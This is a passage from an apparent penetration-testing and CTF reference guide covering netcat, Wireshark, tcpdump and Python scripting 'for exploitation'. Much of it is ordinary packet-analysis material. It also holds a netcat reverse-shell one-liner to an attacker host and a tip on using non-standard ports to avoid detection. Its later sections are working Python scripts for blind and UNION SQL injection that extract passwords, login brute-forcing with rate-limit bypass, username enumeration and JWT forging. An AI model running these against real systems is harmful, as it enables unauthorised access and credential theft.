kill -9 <PID>

# "Connection refused"
# Solution: Port is closed or filtered
# Verify with nmap:
nmap -p 4444 target.com

# "No route to host"
# Solution: Network/firewall issue
# Check connectivity:
ping target.com
traceroute target.com

# "Permission denied" (port < 1024)
# Solution: Use sudo for privileged ports
sudo nc -l -p 80

# Netcat hangs/doesn't close
# Solution: Use -q flag or send EOF
nc -q 1 target.com 80  # Close 1 second after EOF

# Can't use -e flag
# Solution: Use pipe method or compile netcat with -e support
rm /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/sh -i 2>&1 | nc attacker_ip 4444 > /tmp/f

# Verbose output not showing
# Solution: Redirect stderr to stdout
nc -v target.com 80 2>&1

# UDP not working
# Solution: Verify -u flag and target actually uses UDP
nc -uv target.com 53
```

### Security Considerations

```bash
# Netcat security best practices:

# 1. Restrict access with firewall rules
iptables -A INPUT -p tcp --dport 4444 -s attacker_ip -j ACCEPT
iptables -A INPUT -p tcp --dport 4444 -j DROP

# 2. Use ncat with SSL instead of plain netcat
ncat --ssl -l -p 4444

# 3. Use authentication when possible
# ncat with --allow or scripted authentication

# 4. Don't leave listeners running
# Use timeout or auto-close after use

# 5. Monitor netcat connections
netstat -tnlp | grep nc
ss -tnlp | grep nc

# 6. Log all sessions
nc -l -p 4444 | tee -a nc_sessions.log

# 7. Use non-standard ports to avoid detection
nc -l -p 34567  # Instead of common 4444

# 8. Combine with port knocking
# Only open port after specific sequence

# 9. Encrypt sensitive data before transfer
# Use openssl enc before sending via nc

# 10. Clean up after use
rm /tmp/f /tmp/backpipe
```

---

**Related Advanced Topics:**

- **Socat** - Advanced data relay and networking tool (more features than netcat)
- **Proxychains** - Force applications through proxy chains
- **SSH Tunneling** - Secure alternative to netcat port forwarding
- **Metasploit Handlers** - Advanced payload handling for reverse shells
- **PowerShell Remoting** - Windows alternative for remote shells

---

## Wireshark

### Installation and Launch

**Pre-installed on Kali**:

```bash
wireshark
# Or with sudo for packet capture
sudo wireshark
```

**Non-root capture setup** (recommended):

```bash
# Add user to wireshark group
sudo usermod -a -G wireshark $USER

# Reboot or re-login for changes to take effect
# Then launch without sudo
wireshark
```

**Command-line version** (tshark):

```bash
tshark -i eth0
```

### Interface Overview

**Capture interfaces**:

```
Capture → Options
Select interface: eth0, wlan0, lo, etc.
Promiscuous mode: Enable (capture all packets on network)
```

**Start capture**:

```bash
# GUI: Click shark fin icon or Capture → Start

# CLI equivalent
tshark -i eth0 -w capture.pcap
```

### Display Filters

**Basic syntax**:

```
protocol.field operator value
```

**Common filters**:

```
# HTTP traffic only
http

# Specific IP address
ip.addr == 10.10.10.100

# Source IP
ip.src == 192.168.1.10

# Destination IP
ip.dst == 192.168.1.20

# Specific port
tcp.port == 80

# HTTP GET requests
http.request.method == "GET"

# HTTP POST requests
http.request.method == "POST"

# Contains specific string
http contains "password"

# SQL keywords in traffic
tcp contains "SELECT" || tcp contains "UNION"

# DNS queries
dns.qry.name

# Exclude traffic
!(ip.addr == 192.168.1.1)
```

**Logical operators**:

```
# AND
ip.src == 10.10.10.100 && tcp.port == 80

# OR
tcp.port == 80 || tcp.port == 443

# NOT
!arp

# Combination
ip.src == 10.10.10.100 && (tcp.port == 80 || tcp.port == 443)
```

**Protocol-specific filters**:

```
# TLS/SSL traffic
tls

# TLS handshake
tls.handshake

# SSH traffic
ssh

# FTP commands
ftp.request.command

# SMTP commands
smtp.req.command

# ARP requests
arp.opcode == 1

# ICMP echo requests
icmp.type == 8
```

### Capture Filters (BPF Syntax)

**Applied before capture starts** (more efficient):

```
# Specific host
host 10.10.10.100

# Network range
net 192.168.1.0/24

# Port
port 80

# Multiple ports
port 80 or port 443

# Port range
portrange 1-1024

# Protocol
tcp
udp
icmp

# Combination
host 10.10.10.100 and port 80

# Exclude
not port 22
```

**Set capture filter**:

```
Capture → Options → Capture Filter
Enter: host 10.10.10.100 and port 80
```

### HTTP Analysis

**Extract HTTP objects**:

```
File → Export Objects → HTTP
Select objects to save
Save All: Extract all HTTP objects
```

**Follow HTTP stream**:

```
Right-click HTTP packet → Follow → HTTP Stream
View: Entire conversation
Format: ASCII, Hex Dump, C Array, Raw
```

**HTTP statistics**:

```
Statistics → HTTP → Packet Counter
Statistics → HTTP → Requests
Statistics → HTTP → Load Distribution
```

**Filter HTTP credentials**:

```
# Basic authentication
http.authbasic

# Form-based (POST data)
http.request.method == "POST" && http contains "password"

# Cookies
http.cookie
```

### TLS/SSL Analysis

**Filter TLS handshake**:

```
tls.handshake.type == 1  # Client Hello
tls.handshake.type == 2  # Server Hello
tls.handshake.type == 11 # Certificate
```

**Extract certificates**:

```
Filter: tls.handshake.certificate
Right-click packet → Export Packet Bytes
Save as: certificate.der

# Convert to readable format
openssl x509 -inform der -in certificate.der -text
```

**TLS decryption** (requires private key):

```
Edit → Preferences → Protocols → TLS
RSA keys list → Edit
IP address: 10.10.10.100
Port: 443
Protocol: http
Key File: /path/to/server.key
```

[Inference]: TLS decryption requires possession of server's private key or pre-master secret; modern perfect forward secrecy (PFS) prevents decryption without live capture of key exchange.

### TCP Stream Analysis

**Follow TCP stream**:

```
Right-click TCP packet → Follow → TCP Stream
Stream: Select specific stream number
Direction: Client→Server, Server→Client, Both
```

**TCP conversation statistics**:

```
Statistics → Conversations
TCP tab: View all TCP conversations
Sort by: Bytes, Packets, Duration
```

**TCP flags filter**:

```
# SYN packets
tcp.flags.syn == 1 && tcp.flags.ack == 0

# SYN-ACK packets
tcp.flags.syn == 1 && tcp.flags.ack == 1

# RST packets
tcp.flags.reset == 1

# PSH packets (data push)
tcp.flags.push == 1

# FIN packets
tcp.flags.fin == 1
```

**TCP retransmissions**:

```
tcp.analysis.retransmission
tcp.analysis.duplicate_ack
tcp.analysis.lost_segment
```

### DNS Analysis

**DNS queries and responses**:

```
# All DNS traffic
dns

# DNS queries only
dns.flags.response == 0

# DNS responses only
dns.flags.response == 1

# Specific query type
dns.qry.type == 1  # A record
dns.qry.type == 28 # AAAA record
dns.qry.type == 15 # MX record
dns.qry.type == 16 # TXT record

# Query for specific domain
dns.qry.name contains "example.com"
```

**DNS statistics**:

```
Statistics → DNS
View: Request-response pairs, query types
```

**DNS tunneling detection**:

```
# Unusual query patterns
dns.qry.name.len > 50

# High query rate to single domain
# Check Statistics → Conversations → UDP
```

### Wireless (802.11) Analysis

**Capture wireless traffic**:

```bash
# Put interface in monitor mode
sudo airmon-ng start wlan0

# Start capture
sudo wireshark -i wlan0mon
```

**Wireless filters**:

```
# Beacon frames
wlan.fc.type_subtype == 0x08

# Probe requests
wlan.fc.type_subtype == 0x04

# Probe responses
wlan.fc.type_subtype == 0x05

# Authentication frames
wlan.fc.type_subtype == 0x0b

# Deauthentication frames
wlan.fc.type_subtype == 0x0c

# Data frames
wlan.fc.type == 2

# Specific SSID
wlan.ssid == "NetworkName"

# Specific MAC address
wlan.addr == aa:bb:cc:dd:ee:ff
```

**WPA handshake capture**:

```
# Filter for EAPOL (handshake)
eapol

# Four-way handshake components
eapol && wlan.addr == [target_mac]
```

### Packet Analysis for CTF

**Credential extraction**:

```
# FTP credentials
ftp.request.command == "USER" || ftp.request.command == "PASS"

# Telnet credentials
telnet && (tcp.port == 23)
Follow TCP stream to see plaintext

# HTTP Basic Auth
http.authbasic
# Decode Base64 in packet details

# POP3 credentials
pop.request.command == "USER" || pop.request.command == "PASS"

# SMTP authentication
smtp.req.command == "AUTH"
```

**File extraction from PCAP**:

```bash
# Using binwalk
binwalk -e capture.pcap

# Using foremost
foremost -i capture.pcap -o extracted/

# Using NetworkMiner (GUI tool)
networkminer capture.pcap
```

**Searching for strings**:

```
Edit → Find Packet
Display filter: frame contains "flag"
String: flag{
```

**Hex pattern search**:

```
Edit → Find Packet
Hex value: 89504e47 (PNG header)
```

### Statistics and Analysis

**Protocol hierarchy**:

```
Statistics → Protocol Hierarchy
Shows: Percentage of each protocol
Useful: Identify dominant traffic types
```

**IO graphs**:

```
Statistics → I/O Graph
Y Axis: Packets/second, Bytes/second
Filter: Apply display filter
Multiple graphs: Compare different filters
```

**Endpoints**:

```
Statistics → Endpoints
Tabs: Ethernet, IPv4, IPv6, TCP, UDP
Sort by: Packets, Bytes
```

**Conversations**:

```
Statistics → Conversations
View: All communications between endpoints
Filter: Apply to specific conversation
```

### Command-Line Analysis (tshark)

**Basic capture**:

```bash
# Capture to file
tshark -i eth0 -w capture.pcap

# Capture with filter
tshark -i eth0 -f "host 10.10.10.100" -w filtered.pcap

# Capture limited packets
tshark -i eth0 -c 1000 -w capture.pcap
```

**Read and filter PCAP**:

```bash
# Display all packets
tshark -r capture.pcap

# Apply display filter
tshark -r capture.pcap -Y "http.request.method == GET"

# Extract specific fields
tshark -r capture.pcap -Y http.request -T fields -e http.host -e http.request.uri

# HTTP credentials
tshark -r capture.pcap -Y http.authbasic -T fields -e http.authorization
```

**Extract HTTP objects**:

```bash
# List HTTP objects
tshark -r capture.pcap --export-objects http,./http_objects/

# Extract files
mkdir http_objects
tshark -r capture.pcap --export-objects http,http_objects/
```

**Statistics**:

```bash
# Protocol hierarchy
tshark -r capture.pcap -q -z io,phs

# Conversations
tshark -r capture.pcap -q -z conv,tcp

# HTTP statistics
tshark -r capture.pcap -q -z http,tree
```

**DNS queries**:

```bash
tshark -r capture.pcap -Y "dns.flags.response == 0" -T fields -e dns.qry.name
```

**Follow streams**:

```bash
# TCP stream
tshark -r capture.pcap -q -z follow,tcp,ascii,0

# HTTP stream
tshark -r capture.pcap -q -z follow,http,ascii,0
```

### Advanced Techniques

**Custom columns**:

```
Edit → Preferences → Appearance → Columns
Add: 
- Title: HTTP Host
- Type: Custom
- Fields: http.host
```

**Coloring rules**:

```
View → Coloring Rules
Add rule:
- Name: HTTP Errors
- Filter: http.response.code >= 400
- Foreground: Red
- Background: Light Yellow
```

**Time display**:

```
View → Time Display Format
Options:
- Seconds Since Beginning of Capture
- Seconds Since Previous Displayed Packet
- UTC Date and Time of Day
```

**Expert information**:

```
Analyze → Expert Information
Categories: Chat, Note, Warn, Error
Groups: Checksum, Sequence, Malformed
```

### Performance Optimization

**Ring buffer** (continuous capture):

```
Capture → Options → Output
[x] Create a new file automatically
After: 100 megabytes
Use a ring buffer with: 10 files
```

**Capture filters for performance**:

```bash
# Capture only what you need
sudo wireshark -i eth0 -f "host 10.10.10.100 and port 80"
```

**Disable name resolution**:

```
View → Name Resolution
[ ] Resolve Network Addresses
[ ] Resolve Transport Addresses
```

### Decryption and Decoding

**WEP decryption**:

```
Edit → Preferences → Protocols → IEEE 802.11
Decryption keys: Edit
Key type: wep
Key: 13:37:C0:DE:00 (hex)
```

**WPA/WPA2 decryption**:

```
Edit → Preferences → Protocols → IEEE 802.11
Enable decryption: [x]
Decryption keys: Edit
Key type: wpa-pwd
Key: password:SSID
```

Requires: Complete 4-way handshake capture.

**Base64 decode in display**:

```
# HTTP Authorization header automatically decoded
http.authbasic shows decoded value in packet details
```

### Troubleshooting

**Permission denied**:

```bash
# Add user to wireshark group
sudo usermod -a -G wireshark $USER
# Logout and login

# Or run with sudo (not recommended)
sudo wireshark
```

**No interfaces visible**:

```bash
# Check interfaces
ip link show

# Restart udev
sudo systemctl restart systemd-udevd

# Check dumpcap permissions
sudo chmod +x /usr/bin/dumpcap
sudo setcap cap_net_raw,cap_net_admin=eip /usr/bin/dumpcap
```

**Dropped packets**:

```
# Check capture statistics
Statistics → Capture File Properties
Interface: Shows dropped packets

# Increase buffer size
Capture → Options → Buffer size: 4 MB (or higher)
```

## tcpdump

### Basic Usage

**Installation verification**:

```bash
tcpdump --version
```

**Simple capture**:

```bash
# Requires root
sudo tcpdump

# Specific interface
sudo tcpdump -i eth0

# List interfaces
tcpdump -D
```

**Write to file**:

```bash
# Standard format
sudo tcpdump -i eth0 -w capture.pcap

# With packet count limit
sudo tcpdump -i eth0 -c 1000 -w capture.pcap

# Readable format (-tttt for timestamps, -n for no resolution)
sudo tcpdump -i eth0 -tttt -n -w capture.pcap
```

### Capture Filters

**Host filtering**:

```bash
# Specific host
sudo tcpdump -i eth0 host 10.10.10.100

# Source host
sudo tcpdump -i eth0 src host 10.10.10.100

# Destination host
sudo tcpdump -i eth0 dst host 10.10.10.100

# Network range
sudo tcpdump -i eth0 net 192.168.1.0/24
```

**Port filtering**:

```bash
# Specific port
sudo tcpdump -i eth0 port 80

# Source port
sudo tcpdump -i eth0 src port 80

# Destination port
sudo tcpdump -i eth0 dst port 443

# Port range
sudo tcpdump -i eth0 portrange 1-1024

# Multiple ports
sudo tcpdump -i eth0 'port 80 or port 443'
```

**Protocol filtering**:

```bash
# TCP only
sudo tcpdump -i eth0 tcp

# UDP only
sudo tcpdump -i eth0 udp

# ICMP only
sudo tcpdump -i eth0 icmp

# ARP only
sudo tcpdump -i eth0 arp

# IPv6
sudo tcpdump -i eth0 ip6
```

**Complex filters**:

```bash
# Combine with AND
sudo tcpdump -i eth0 'host 10.10.10.100 and port 80'

# Combine with OR
sudo tcpdump -i eth0 'port 80 or port 443'

# Combine with NOT
sudo tcpdump -i eth0 'not port 22'

# Parentheses for grouping
sudo tcpdump -i eth0 'host 10.10.10.100 and (port 80 or port 443)'

# TCP traffic to specific host excluding SSH
sudo tcpdump -i eth0 'tcp and host 10.10.10.100 and not port 22'
```

### Display Options

**Verbose output**:

```bash
# Standard verbose
sudo tcpdump -i eth0 -v

# More verbose
sudo tcpdump -i eth0 -vv

# Maximum verbose
sudo tcpdump -i eth0 -vvv
```

**Packet content display**:

```bash
# ASCII output
sudo tcpdump -i eth0 -A

# Hex output
sudo tcpdump -i eth0 -X

# Hex and ASCII
sudo tcpdump -i eth0 -XX

# Show link-level headers
sudo tcpdump -i eth0 -e
```

**Line buffering** (real-time output):

```bash
sudo tcpdump -i eth0 -l | tee capture.log
```

**Suppress name resolution**:

```bash
# No hostname resolution
sudo tcpdump -i eth0 -n

# No hostname or port resolution
sudo tcpdump -i eth0 -nn

# Suppress name resolution (faster)
sudo tcpdump -i eth0 -n host 10.10.10.100
```

### Advanced Filters

**TCP flags**:

```bash
# SYN packets
sudo tcpdump -i eth0 'tcp[tcpflags] & tcp-syn != 0'

# SYN-ACK packets
sudo tcpdump -i eth0 'tcp[tcpflags] & (tcp-syn|tcp-ack) == (tcp-syn|tcp-ack)'

# RST packets
sudo tcpdump -i eth0 'tcp[tcpflags] & tcp-rst != 0'

# FIN packets
sudo tcpdump -i eth0 'tcp[tcpflags] & tcp-fin != 0'

# PSH-ACK packets (data transmission)
sudo tcpdump -i eth0 'tcp[tcpflags] & (tcp-push|tcp-ack) == (tcp-push|tcp-ack)'

# URG packets
sudo tcpdump -i eth0 'tcp[tcpflags] & tcp-urg != 0'
```

**ICMP types**:

```bash
# Echo request (ping)
sudo tcpdump -i eth0 'icmp[icmptype] == icmp-echo'

# Echo reply
sudo tcpdump -i eth0 'icmp[icmptype] == icmp-echoreply'

# Destination unreachable
sudo tcpdump -i eth0 'icmp[icmptype] == icmp-unreach'
```

**Packet size filtering**:

```bash
# Packets greater than 1000 bytes
sudo tcpdump -i eth0 'greater 1000'

# Packets less than 100 bytes
sudo tcpdump -i eth0 'less 100'
```

**Byte offset filtering**:

```bash
# HTTP GET requests (G in GET at byte 0 of payload)
sudo tcpdump -i eth0 'tcp[((tcp[12:1] & 0xf0) >> 2):4] = 0x47455420'

# HTTP POST requests
sudo tcpdump -i eth0 'tcp[((tcp[12:1] & 0xf0) >> 2):4] = 0x504f5354'

# Contains specific hex pattern
sudo tcpdump -i eth0 'tcp[20:2] = 0x4854' # "HT" from HTTP
```

### Reading PCAP Files

**Read file**:

```bash
tcpdump -r capture.pcap
```

**Read with filter**:

```bash
tcpdump -r capture.pcap 'host 10.10.10.100 and port 80'
```

**Convert to readable format**:

```bash
# ASCII output
tcpdump -r capture.pcap -A

# Hex and ASCII
tcpdump -r capture.pcap -XX

# Verbose with no name resolution
tcpdump -r capture.pcap -nn -vvv
```

**Extract specific packets**:

```bash
# Write filtered packets to new file
tcpdump -r capture.pcap 'port 80' -w http_only.pcap
```

### Rotation and Size Management

**Rotate by size**:

```bash
# Create new file every 100MB
sudo tcpdump -i eth0 -w capture.pcap -C 100

# Creates: capture.pcap0, capture.pcap1, capture.pcap2, etc.
```

**Rotate by time**:

```bash
# Create new file every 60 seconds
sudo tcpdump -i eth0 -w capture.pcap -G 60

# Use strftime format for filenames
sudo tcpdump -i eth0 -w 'capture_%Y%m%d_%H%M%S.pcap' -G 3600
```

**Limit number of files**:

```bash
# Keep only 10 most recent files
sudo tcpdump -i eth0 -w capture.pcap -C 100 -W 10
```

### Practical CTF Examples

**Capture HTTP traffic**:

```bash
sudo tcpdump -i eth0 -A -s 0 'tcp port 80 and (((ip[2:2] - ((ip[0]&0xf)<<2)) - ((tcp[12]&0xf0)>>2)) != 0)'
```

**Extract credentials**:

```bash
# FTP
sudo tcpdump -i eth0 -A -s 0 'tcp port 21 and (tcp[((tcp[12:1] & 0xf0) >> 2):4] = 0x55534552 or tcp[((tcp[12:1] & 0xf0) >> 2):4] = 0x50415353)'

# Telnet
sudo tcpdump -i eth0 -A -s 0 'tcp port 23'

# HTTP Basic Auth
sudo tcpdump -i eth0 -A -s 0 'tcp port 80 and tcp[((tcp[12:1] & 0xf0) >> 2):4] = 0x41757468' # "Auth"
```

**DNS queries**:

```bash
sudo tcpdump -i eth0 -n port 53
```

**ARP spoofing detection**:

```bash
sudo tcpdump -i eth0 arp
```

**Capture and immediately analyze**:

```bash
sudo tcpdump -i eth0 -w - | wireshark -k -i -
```

### Statistics and Analysis

**Count packets**:

```bash
tcpdump -r capture.pcap | wc -l
```

**Top talkers**:

```bash
tcpdump -r capture.pcap -nn | awk '{print $3}' | cut -d. -f1-4 | sort | uniq -c | sort -nr | head -10
```

**HTTP hosts accessed**:

```bash
tcpdump -r capture.pcap -A -s 0 | grep -oP 'Host: \K.*' | sort | uniq -c | sort -nr
```

**Port distribution**:

```bash
tcpdump -r capture.pcap -nn | awk '{print $5}' | cut -d. -f5 | cut -d: -f1 | sort | uniq -c | sort -nr
```

### Integration with Other Tools

**Pipe to grep**:

```bash
sudo tcpdump -i eth0 -A | grep -i 'password'
```

**Pipe to tshark**:

```bash
sudo tcpdump -i eth0 -w - | tshark -r -
```

**Save and analyze**:

```bash
# Capture
sudo tcpdump -i eth0 -w capture.pcap

# Analyze with Wireshark
wireshark capture.pcap

# Or with tshark
tshark -r capture.pcap -Y http.request
```

### Remote Capture

**SSH tunnel capture**:

```bash
ssh root@remote-host "tcpdump -i eth0 -U -s0 -w - 'not port 22'" | wireshark -k -i -
```

**Save remote capture locally**:

```bash
ssh root@remote-host "tcpdump -i eth0 -w - 'not port 22'" > remote_capture.pcap
```

### Performance Optimization

**Snapshot length**:

```bash
# Capture full packets
sudo tcpdump -i eth0 -s 0

# Capture only headers (faster)
sudo tcpdump -i eth0 -s 96

# Default snapshot
sudo tcpdump -i eth0
```

**Buffer size**:

```bash
# Increase buffer (reduce packet loss)
sudo tcpdump -i eth0 -B 4096
```

**Immediate mode** (less buffering):

```bash
sudo tcpdump -i eth0 --immediate-mode
```

## Python Scripting for Exploitation

### Essential Libraries

**Installation**:

```bash
# HTTP requests
pip3 install requests

# Web scraping
pip3 install beautifulsoup4 lxml

# Network programming
pip3 install scapy

# URL parsing
# (urllib is built-in)

# Encoding/decoding
# (base64, hashlib are built-in)
```

### HTTP Requests

**Basic GET request**:

```python
import requests

response = requests.get('http://target.com/api/user?id=1')
print(response.status_code)
print(response.text)
print(response.headers)
```

**POST request with data**:

```python
import requests

data = {
    'username': 'admin',
    'password': 'test123'
}

response = requests.post('http://target.com/login', data=data)
print(response.text)
```

**POST with JSON**:

```python
import requests
import json

payload = {
    'id': 1,
    'action': 'delete'
}

headers = {'Content-Type': 'application/json'}
response = requests.post('http://target.com/api', 
                        data=json.dumps(payload), 
                        headers=headers)
```

**Custom headers**:

```python
import requests

headers = {
    'User-Agent': 'CustomBot/1.0',
    'X-Forwarded-For': '127.0.0.1',
    'Authorization': 'Bearer token123'
}

response = requests.get('http://target.com/', headers=headers)
```

**Session management**:

```python
import requests

session = requests.Session()

# Login
login_data = {'username': 'admin', 'password': 'pass123'}
session.post('http://target.com/login', data=login_data)

# Subsequent requests maintain session
response = session.get('http://target.com/dashboard')
print(response.text)

# Check cookies
print(session.cookies.get_dict())
```

**Proxies**:

```python
import requests

proxies = {
    'http': 'http://127.0.0.1:8080',
    'https': 'http://127.0.0.1:8080'
}

response = requests.get('http://target.com/', proxies=proxies, verify=False)
```

**SSL verification**:

```python
import requests
import urllib3

# Disable warnings
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

# Make request without SSL verification
response = requests.get('https://target.com/', verify=False)
```

**Timeouts and retries**:

```python
import requests
from requests.adapters import HTTPAdapter
from urllib3.util.retry import Retry

session = requests.Session()
retry = Retry(connect=3, backoff_factor=0.5)
adapter = HTTPAdapter(max_retries=retry)
session.mount('http://', adapter)
session.mount('https://', adapter)

response = session.get('http://target.com/', timeout=10)
```

### Web Scraping

**BeautifulSoup basics**:

```python
import requests
from bs4 import BeautifulSoup

response = requests.get('http://target.com/')
soup = BeautifulSoup(response.text, 'lxml')

# Find elements
title = soup.find('title').text
links = soup.find_all('a')

for link in links:
    print(link.get('href'))

# CSS selectors
divs = soup.select('div.content')
```

**Extract forms**:

```python
import requests
from bs4 import BeautifulSoup

response = requests.get('http://target.com/login')
soup = BeautifulSoup(response.text, 'lxml')

forms = soup.find_all('form')
for form in forms:
    action = form.get('action')
    method = form.get('method')
    print(f"Form: {action} ({method})")
    
    inputs = form.find_all('input')
    for input_field in inputs:
        name = input_field.get('name')
        input_type = input_field.get('type')
        print(f"  Input: {name} ({input_type})")
```

**Extract hidden fields**:

```python
from bs4 import BeautifulSoup
import requests

response = requests.get('http://target.com/form')
soup = BeautifulSoup(response.text, 'lxml')

hidden_fields = soup.find_all('input', {'type': 'hidden'})
for field in hidden_fields:
    print(f"{field.get('name')}: {field.get('value')}")
```

### SQL Injection Automation

**Boolean-based blind SQLi**:

```python
import requests
import string

url = 'http://target.com/page.php'
known_password = ""
position = 1

while True:
    found = False
    for char in string.printable:
        # Oracle SUBSTR syntax example
        payload = f"1' AND SUBSTR((SELECT password FROM users WHERE username='admin'),{position},1)='{char}'--"
        
        params = {'id': payload}
        response = requests.get(url, params=params)
        
        # Check for success indicator in response
        if "Welcome" in response.text:
            known_password += char
            print(f"Found: {known_password}")
            position += 1
            found = True
            break
    
    if not found:
        print(f"Final password: {known_password}")
        break
```

**Time-based blind SQLi**:

```python
import requests
import time

url = 'http://target.com/page.php'

def check_char(position, char):
    # MySQL SLEEP example
    payload = f"1' AND IF(SUBSTRING((SELECT password FROM users LIMIT 1),{position},1)='{char}',SLEEP(5),0)--"
    
    params = {'id': payload}
    start_time = time.time()
    
    try:
        requests.get(url, params=params, timeout=10)
    except requests.exceptions.Timeout:
        return True
    
    elapsed = time.time() - start_time
    return elapsed > 4  # If response took >4 seconds, likely correct

password = ""
for pos in range(1, 33):
    for char in 'abcdef0123456789':  # For MD5 hash
        if check_char(pos, char):
            password += char
            print(f"Position {pos}: {char} -> {password}")
            break
```

**UNION-based SQLi**:

```python
import requests
import re

url = 'http://target.com/page.php'

# Determine number of columns
for i in range(1, 20):
    payload = f"1' UNION SELECT {','.join(['NULL']*i)}--"
    params = {'id': payload}
    response = requests.get(url, params=params)
    
    if response.status_code == 200 and "error" not in response.text.lower():
        print(f"Number of columns: {i}")
        columns = i
        break

# Extract data
payload = f"1' UNION SELECT {','.join(['NULL']*(columns-1))},table_name FROM information_schema.tables--"
params = {'id': payload}
response = requests.get(url, params=params)

# Extract table names
tables = re.findall(r'<td>(\w+)</td>', response.text)
print(f"Tables: {tables}")

# Extract columns from specific table
payload = f"1' UNION SELECT {','.join(['NULL']*(columns-1))},column_name FROM information_schema.columns WHERE table_name='users'--"
params = {'id': payload}
response = requests.get(url, params=params)

columns_list = re.findall(r'<td>(\w+)</td>', response.text)
print(f"Columns in 'users': {columns_list}")

# Extract data
payload = f"1' UNION SELECT {','.join(['NULL']*(columns-2))},username,password FROM users--"
params = {'id': payload}
response = requests.get(url, params=params)
print(response.text)
```

### Brute Force Attacks

**Login brute force**:

```python
import requests

url = 'http://target.com/login'
usernames = ['admin', 'root', 'user', 'administrator']
passwords = open('/usr/share/wordlists/rockyou.txt', 'r', encoding='latin-1').readlines()

for username in usernames:
    for password in passwords:
        password = password.strip()
        
        data = {
            'username': username,
            'password': password
        }
        
        response = requests.post(url, data=data)
        
        # Check for success indicators
        if 'Welcome' in response.text or 'Dashboard' in response.text:
            print(f"[+] Valid credentials: {username}:{password}")
            break
        elif response.status_code == 302:
            print(f"[+] Valid credentials (redirect): {username}:{password}")
            break
        else:
            print(f"[-] Failed: {username}:{password}")
```

**With rate limiting bypass**:

```python
import requests
import time
from threading import Thread, Lock

url = 'http://target.com/login'
found = False
lock = Lock()

def try_login(username, password):
    global found
    
    if found:
        return
    
    data = {'username': username, 'password': password}
    
    try:
        response = requests.post(url, data=data, timeout=5)
        
        if 'Welcome' in response.text:
            with lock:
                if not found:
                    found = True
                    print(f"[+] Valid: {username}:{password}")
    except:
        pass

# Read wordlist
passwords = open('/usr/share/wordlists/rockyou.txt', 'r', encoding='latin-1').read().splitlines()[:1000]

# Thread pool
threads = []
for password in passwords:
    t = Thread(target=try_login, args=('admin', password))
    threads.append(t)
    t.start()
    
    # Limit concurrent threads
    if len(threads) >= 10:
        for thread in threads:
            thread.join()
        threads = []
        time.sleep(1)  # Rate limiting

for thread in threads:
    thread.join()
```

**Username enumeration**:

```python
import requests

url = 'http://target.com/reset-password'
usernames = open('/usr/share/seclists/Usernames/top-usernames-shortlist.txt').read().splitlines()

valid_users = []

for username in usernames:
    data = {'username': username}
    response = requests.post(url, data=data)
    
    # Different responses indicate valid user
    if 'reset link sent' in response.text.lower():
        print(f"[+] Valid user: {username}")
        valid_users.append(username)
    elif 'user not found' in response.text.lower():
        print(f"[-] Invalid: {username}")
    
    # Check response time for timing attacks
    # Valid users might take longer to process
    
print(f"\n[+] Valid users: {valid_users}")
```

### API Testing

**REST API fuzzing**:

```python
import requests
import json

base_url = 'http://target.com/api'

# Test different endpoints
endpoints = [
    '/users',
    '/user',
    '/admin',
    '/config',
    '/debug',
    '/test',
    '/v1/users',
    '/v2/users'
]

for endpoint in endpoints:
    url = base_url + endpoint
    
    for method in ['GET', 'POST', 'PUT', 'DELETE', 'PATCH', 'OPTIONS']:
        try:
            response = requests.request(method, url, timeout=5)
            print(f"[{response.status_code}] {method} {url}")
            
            if response.status_code not in [404, 405]:
                print(f"    Response: {response.text[:100]}")
        except:
            pass
```

**API parameter fuzzing**:

```python
import requests

url = 'http://target.com/api/user'

# Test different parameter names
params_to_test = ['id', 'user_id', 'userid', 'uid', 'user', 'account', 'username']
values_to_test = ['1', 'admin', '../../../etc/passwd', "1' OR '1'='1", '<script>alert(1)</script>']

for param in params_to_test:
    for value in values_to_test:
        params = {param: value}
        response = requests.get(url, params=params)
        
        if response.status_code == 200:
            print(f"[+] Valid parameter: {param}={value}")
            print(f"    Response length: {len(response.text)}")
            
            # Check for interesting responses
            if 'error' not in response.text.lower():
                print(f"    Response: {response.text[:200]}")
```

**JWT manipulation**:

```python
import base64
import json
import hmac
import hashlib

def decode_jwt(token):
    parts = token.split('.')
    
    # Decode header
    header = json.loads(base64.urlsafe_b64decode(parts[0] + '=='))
    
    # Decode payload
    payload = json.loads(base64.urlsafe_b64decode(parts[1] + '=='))
    
    return header, payload, parts[2]

def encode_jwt(header, payload, secret=''):
    # Encode header
    header_encoded = base64.urlsafe_b64encode(
        json.dumps(header).encode()
    ).decode().rstrip('=')
    
    # Encode payload
    payload_encoded = base64.urlsafe_b64encode(
        json.dumps(payload).encode()
    ).decode().rstrip('=')
    
    # Create signature
    if secret:
        message = f"{header_encoded}.{payload_encoded}"
        signature = base64.urlsafe_b64encode(
            hmac.new(secret.encode(), message.encode(), hashlib.sha256).digest()
        ).decode().rstrip('=')
    else:
        signature = ''
    
    return f"{header_encoded}.{payload_encoded}.{signature}"

# Example usage
token = "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VyIjoiZ3Vlc3QiLCJyb2xlIjoidXNlciJ9.signature"

header, payload, signature = decode_jwt(token)
print(f"Header: {header}")
print(f"Payload: {payload}")

# Modify payload
payload['role'] = 'admin'

# Test none algorithm attack
header['alg'] = 'none'
malicious_token = encode_jwt(header, payload)
print(f"None algorithm token: {malicious_token}")

# Test with weak secret
weak_secrets = ['secret', 'password', 'key', '123456']
for secret in weak_secrets:
    test_token = encode_jwt(header, payload, secret)
    print(f"Token with secret '{secret}': {test_token}")
```

### Network Programming with Sockets

**TCP client**:

```python
import socket

host = '10.10.10.100'
port = 9999

# Create socket
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect((host, port))

# Send data
s.send(b'Hello, Server!\n')

# Receive response
response = s.recv(4096)
print(response.decode())

s.close()
```

**TCP server**:

```python
import socket

host = '0.0.0.0'
port = 4444

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
s.bind((host, port))
s.listen(5)

print(f"[*] Listening on {host}:{port}")

while True:
    client, addr = s.accept()
    print(f"[+] Connection from {addr[0]}:{addr[1]}")
    
    data = client.recv(4096)
    print(f"[*] Received: {data.decode()}")
    
    client.send(b'HTTP/1.1 200 OK\r\nContent-Length: 13\r\n\r\nHello, World!')
    client.close()
```

**UDP client**:

```python
import socket

host = '10.10.10.100'
port = 53

s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
s.sendto(b'DNS query', (host, port))

data, addr = s.recvfrom(4096)
